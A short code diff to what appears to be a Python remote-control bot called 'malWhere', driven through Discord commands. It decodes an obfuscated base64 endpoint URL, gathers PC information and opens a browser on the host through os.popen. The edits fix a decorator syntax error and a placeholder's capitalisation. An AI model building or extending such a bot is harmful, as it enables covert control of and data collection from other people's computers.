@@ -10,7 +10,7 @@ import getpass
 import psutil
 import PIL
 
-encryptedapi="<base64 encoded api url>"
+encryptedapi="<Base64 encoded api url>"
 base64_string =encryptedapi
 base64_bytes = base64_string.encode("ascii")
 sample_string_bytes = base64.b64decode(base64_bytes)
@@ -122,7 +122,7 @@ async def pcinfo(ctx):
   except:
     ctx.message.send("An Error Has Occured Please Try Again")
 
-@malWhere.command():
+@malWhere.command()
 async def rickroll(ctx):
   try:
     os.popen("chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ")
